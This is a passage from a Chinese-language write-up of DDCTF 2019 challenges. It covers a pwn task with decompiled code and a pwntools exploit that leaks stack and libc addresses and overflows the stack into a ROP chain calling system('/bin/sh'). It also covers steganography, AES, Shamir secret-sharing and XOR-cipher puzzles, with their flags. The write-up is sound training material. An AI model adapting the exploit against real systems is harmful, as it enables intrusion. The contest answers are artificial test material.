class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态调试，可以发现内存里面有栈地址，以及libc地址，填充0x28位字符，即可泄露</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134617-48f34d96-619d-1.png" alt=""></p><p>漏洞二：输入长度为有符号数，长度判断没有判断是否为负数，导致栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  input_name(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> ) <span class="comment">// 负数绕过</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>长度那里输入<code>-1</code>，即可获得<code>4294967295</code>长度的输入，不过这里不是一般的栈溢出，具体需要分析汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:08048732                 add     esp, 10h</span><br><span class="line">.text:08048735                 mov     eax, 0</span><br><span class="line">.text:0804873A                 lea     esp, [ebp-8]</span><br><span class="line">.text:0804873D                 pop     ecx</span><br><span class="line">.text:0804873E                 pop     ebx</span><br><span class="line">.text:0804873F                 pop     ebp</span><br><span class="line">.text:08048740                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048743                 retn</span><br></pre></td></tr></table></figure><p>留意到程序最后<code>lea     esp, [ecx-4]</code>，那么要控制<code>esp</code>就需要控制<code>ecx</code>。而<code>ecx</code>的值为<code>ebp-8</code>处的值，那么我们需要覆盖<code>ebp-8</code>为我们可控的栈空间地址。通过漏洞一，已经知道栈地址和libc基址，可以在第二次输入的开头构造ROP，然后控制<code>ecx</code>的值为ROP地址<code>+4</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'username: '</span>,<span class="string">'1'</span>*<span class="number">0x27</span>)</span><br><span class="line">p.recvuntil(<span class="string">'1'</span>*<span class="number">0x27</span>+<span class="string">'\n'</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(hex(stack))</span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.sym[<span class="string">'setbuf'</span>] - <span class="number">21</span></span><br><span class="line">success(hex(libc.address))</span><br><span class="line">p.sendlineafter(<span class="string">'password: '</span>,<span class="string">'-1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'): '</span>,flat(libc.sym[<span class="string">'system'</span>],<span class="number">0</span>,libc.search(<span class="string">'/bin/sh'</span>).next()).ljust(<span class="number">68</span>,<span class="string">'a'</span>)+p32(stack<span class="number">-0x4c</span>+<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">'bye!\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p>检查http包的过程中，发现有PNG的文件头，提取图片找到一个钥匙图片，调整一下分辨率，发现底部有一个key</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134702-63f6c8de-619d-1.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:57pmYyWt</span><br></pre></td></tr></table></figure><p>继续查找，还发现两个一样的美女傻笑图，不过有一张特别大。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134644-5953d7b4-619d-1.png" alt=""></p><p>然后根据跟踪http的信息，可以猜测出题人使用在线加密工具（ 地址是：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a> ），将flag隐藏在图片中，密码就是刚刚找到的key。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /aideddesign/img_add_info HTTP/1.1</span><br><span class="line">Host: tools.jb51.net</span><br><span class="line">User-Agent: curl/7.54.0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure><p>使用刚才找到的较大那张美女傻笑图，用key进行解密，可以得到隐藏的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图片中隐藏的信息为：flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</span><br></pre></td></tr></table></figure><p>HEX解一下得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;QEWokcpHeUo2WOfBIN7pogIWsF04iRjt&#125;</span><br></pre></td></tr></table></figure></p><h3 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h3><p>Color Threshold</p><p>提示：AES ECB密钥为小写字母</p><p>提示2：密钥不足位用\0补全</p><p>提示3：不要光记得隐写不看图片本身啊…</p><p><a href="https://ddctf.didichuxing.com/files/493054389fbb6a9ff9924e7adf332d33/bmp.zip" target="_blank" rel="noopener">下载地址</a></p><p>RGB LSB隐写得到密文<code>iKk/Ju3vu4wOnssdIaUSrg==</code></p><p>秘钥需要在图片上寻找了。题目提示<code>Color threshold</code>，所以是在颜色上做文章。经观察，魏公村站颜色与同路线略有不同，所以尝试密码<code>weigongcun\x00\x00\x00\x00\x00\x00</code>，使用AES-ECB解密，成功得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">AEScipher = AES.new(<span class="string">'weigongcun\x00\x00\x00\x00\x00\x00'</span>,<span class="number">1</span>)</span><br><span class="line">print(AEScipher.decrypt(<span class="string">'iKk/Ju3vu4wOnssdIaUSrg=='</span>.decode(<span class="string">'base64'</span>)))</span><br></pre></td></tr></table></figure><h3 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h3><p>为了共同的利益，【组织1】和【组织2】成立了联盟，并遵守共同约定的协议。为了让协议的制定和修改更加公平，组织1和组织2共同决定：当三位以上【组织1】成员和三位以上【组织2】成员同意时，才可以制定或修改协议。为了实现这一功能，联盟的印章被锁在密码保险柜中，而保险柜的密码只通过Shamir秘密分享方案分享给【组织1】和【组织2】的每一位成员。现在，【组织1】的【成员1】、【成员2】、【成员4】，【组织2】的【成员3】、【成员4】、【成员5】一致同意制定新的协议。请还原出这套方案的设计思路，按照这套方案的思路恢复出保险柜密码，取出印章吧！</p><p>以下为使用到的7个十六进制常数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p =</span><br><span class="line">C53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span><br><span class="line">组织1成员1 =</span><br><span class="line">30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A</span><br><span class="line">组织1成员2 =</span><br><span class="line">1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7</span><br><span class="line">组织1成员4 =</span><br><span class="line">1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC</span><br><span class="line">组织2成员3 =</span><br><span class="line">300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA</span><br><span class="line">组织2成员4 =</span><br><span class="line">1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9</span><br><span class="line">组织2成员5 =</span><br><span class="line">9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</span><br></pre></td></tr></table></figure><p>应该是通过组织1的成员1，2，4 恢复出来组织1的秘钥</p><p>然后通过组织2的成员 3,4,5 恢复出来组织2的秘钥</p><p>然后将组织1和组织2的秘钥，恢复出来flag。</p><p>找到一篇文章可供参考</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134305-d69c8dac-619c-1.png" alt=""></p><p>发挥搜索能力，然后直接找到了wiki。 直接抄<a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing#Preparation" target="_blank" rel="noopener">wiki</a> 上的代码即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The following Python implementation of Shamir's Secret Sharing is</span></span><br><span class="line"><span class="comment"># released into the Public Domain under the terms of CC0 and OWFa:</span></span><br><span class="line"><span class="comment"># https://creativecommons.org/publicdomain/zero/1.0/</span></span><br><span class="line"><span class="comment"># http://www.openwebfoundation.org/legal/the-owf-1-0-agreements/owfa-1-0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See the bottom few lines for usage. Tested on Python 2 and 3.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12th Mersenne Prime</span></span><br><span class="line"><span class="comment"># (for this application we want a known prime number as close as</span></span><br><span class="line"><span class="comment"># possible to our security level; e.g.  desired security level of 128</span></span><br><span class="line"><span class="comment"># bits -- too large and all the ciphertext is large; too small and</span></span><br><span class="line"><span class="comment"># security is compromised)</span></span><br><span class="line"></span><br><span class="line">_PRIME = <span class="number">0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span></span><br><span class="line"><span class="comment"># 13th Mersenne Prime is 2**521 - 1</span></span><br><span class="line"></span><br><span class="line">_RINT = functools.partial(random.SystemRandom().randint, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_eval_at</span><span class="params">(poly, x, prime)</span>:</span></span><br><span class="line">    <span class="string">'''evaluates polynomial (coefficient tuple) at x, used to generate a</span></span><br><span class="line"><span class="string">    shamir pool in make_random_shares below.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    accum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> coeff <span class="keyword">in</span> reversed(poly):</span><br><span class="line">        accum *= x</span><br><span class="line">        accum += coeff</span><br><span class="line">        accum %= prime</span><br><span class="line">    <span class="keyword">return</span> accum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_random_shares</span><span class="params">(minimum, shares, prime=_PRIME)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Generates a random shamir pool, returns the secret and the share</span></span><br><span class="line"><span class="string">    points.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> minimum &gt; shares:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"pool secret would be irrecoverable"</span>)</span><br><span class="line">    poly = [_RINT(prime) <span class="keyword">for</span> i <span class="keyword">in</span> range(minimum)]</span><br><span class="line">    points = [(i, _eval_at(poly, i, prime))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, shares + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> poly[<span class="number">0</span>], points</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_extended_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    division in integers modulus p means finding the inverse of the</span></span><br><span class="line"><span class="string">    denominator modulo p and then multiplying the numerator by this</span></span><br><span class="line"><span class="string">    inverse (Note: inverse of A is B such that A*B % p == 1) this can</span></span><br><span class="line"><span class="string">    be computed via extended Euclidean algorithm</span></span><br><span class="line"><span class="string">    http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Computation</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    last_x = <span class="number">1</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    last_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        quot = a // b</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">        x, last_x = last_x - quot * x, x</span><br><span class="line">        y, last_y = last_y - quot * y, y</span><br><span class="line">    <span class="keyword">return</span> last_x, last_y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_divmod</span><span class="params">(num, den, p)</span>:</span></span><br><span class="line">    <span class="string">'''compute num / den modulo prime p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    To explain what this means, the return value will be such that</span></span><br><span class="line"><span class="string">    the following is true: den * _divmod(num, den, p) % p == num</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    inv, _ = _extended_gcd(den, p)</span><br><span class="line">    <span class="keyword">return</span> num * inv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_lagrange_interpolate</span><span class="params">(x, x_s, y_s, p)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Find the y-value for the given x, given n (x, y) points;</span></span><br><span class="line"><span class="string">    k points will define a polynomial of up to kth order</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    k = len(x_s)</span><br><span class="line">    <span class="keyword">assert</span> k == len(set(x_s)), <span class="string">"points must be distinct"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PI</span><span class="params">(vals)</span>:</span>  <span class="comment"># upper-case PI -- product of inputs</span></span><br><span class="line">        accum = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> vals:</span><br><span class="line">            accum *= v</span><br><span class="line">        <span class="keyword">return</span> accum</span><br><span class="line">    nums = []  <span class="comment"># avoid inexact division</span></span><br><span class="line">    dens = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        others = list(x_s)</span><br><span class="line">        cur = others.pop(i)</span><br><span class="line">        nums.append(PI(x - o <span class="keyword">for</span> o <span class="keyword">in</span> others))</span><br><span class="line">        dens.append(PI(cur - o <span class="keyword">for</span> o <span class="keyword">in</span> others))</span><br><span class="line">    den = PI(dens)</span><br><span class="line">    num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)</span><br><span class="line">               <span class="keyword">for</span> i <span class="keyword">in</span> range(k)])</span><br><span class="line">    <span class="keyword">return</span> (_divmod(num, den, p) + p) % p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_secret</span><span class="params">(shares, prime=_PRIME)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Recover the secret from share points</span></span><br><span class="line"><span class="string">    (x,y points on the polynomial)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> len(shares) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"need at least two shares"</span>)</span><br><span class="line">    x_s, y_s = zip(*shares)</span><br><span class="line">    <span class="keyword">return</span> _lagrange_interpolate(<span class="number">0</span>, x_s, y_s, prime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''main function'''</span></span><br><span class="line">    secret, shares = make_random_shares(minimum=<span class="number">3</span>, shares=<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'secret:                                                     '</span>,</span><br><span class="line">          secret)</span><br><span class="line">    print(<span class="string">'shares:'</span>)</span><br><span class="line">    <span class="keyword">if</span> shares:</span><br><span class="line">        <span class="keyword">for</span> share <span class="keyword">in</span> shares:</span><br><span class="line">            print(<span class="string">'  '</span>, share)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'secret recovered from minimum subset of shares:             '</span>,</span><br><span class="line">          recover_secret(shares[:<span class="number">3</span>]))</span><br><span class="line">    print(<span class="string">'secret recovered from a different minimum subset of shares: '</span>,</span><br><span class="line">          recover_secret(shares[<span class="number">-3</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DDCTF</span><span class="params">()</span>:</span></span><br><span class="line">    shares1=[(<span class="number">1</span>,<span class="number">0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A</span>),</span><br><span class="line">    (<span class="number">2</span>,<span class="number">0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7</span>),</span><br><span class="line">    (<span class="number">4</span>,<span class="number">0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC</span>)]</span><br><span class="line"></span><br><span class="line">    shares2=[(<span class="number">3</span>,<span class="number">0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA</span>),</span><br><span class="line">    (<span class="number">4</span>,<span class="number">0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9</span>),</span><br><span class="line">    (<span class="number">5</span>,<span class="number">0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</span>)]</span><br><span class="line"></span><br><span class="line">    shares3=[(<span class="number">1</span>,recover_secret(shares1)),(<span class="number">2</span>,recover_secret(shares2))]</span><br><span class="line"></span><br><span class="line">    print(libnum.n2s(recover_secret(shares3)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    DDCTF()  <span class="comment"># DDCTF&#123;5x3ROxvqF2SJrDdVy73IADA04PxdLLab&#125;</span></span><br></pre></td></tr></table></figure><h3 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h3><p>原文为英语，请破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b7865